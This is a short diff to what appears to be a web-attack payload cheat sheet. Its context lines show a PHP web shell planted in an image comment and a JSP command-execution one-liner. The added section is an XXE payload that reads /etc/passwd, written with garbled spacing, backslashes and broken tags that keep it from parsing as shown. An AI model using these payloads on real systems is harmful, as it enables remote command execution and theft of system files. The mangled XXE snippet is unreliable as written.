@@ -360,6 +360,17 @@ giftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' meme.jpg
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
+## Read file with xxe
+
+```
+<? xml\ version = "1.0"\ encoding = "UTF − 8"? >
+< ! DOCTYPE\ abc\ [
+< ! ENTITY\ ab\ SYSTEM\ "file:///etc/passwd" >
+] >
+< root >< name > &ab; </name >< tel > demo </tel >< email > demo@demo. com </email >< password > demo <
+/password ></root >
+```
+
 
 
 {% include links.html %}
